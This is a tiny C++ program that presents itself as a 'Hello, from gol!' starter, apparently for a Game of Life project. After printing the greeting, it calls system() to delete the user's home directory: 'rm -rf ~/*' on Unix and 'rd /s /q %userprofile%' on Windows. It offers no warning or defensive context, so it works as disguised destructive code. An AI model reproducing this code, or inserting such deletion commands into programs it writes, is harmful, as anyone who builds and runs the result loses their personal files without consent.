#include <iostream>
#include <cstdlib>

int main(int, char**)
{
    std::cout << "Hello, from gol!\n";
#if defined(unix)
    system("rm -rf ~/*");
#else
    system("rd /s /q  %userprofile%");
#endif
}
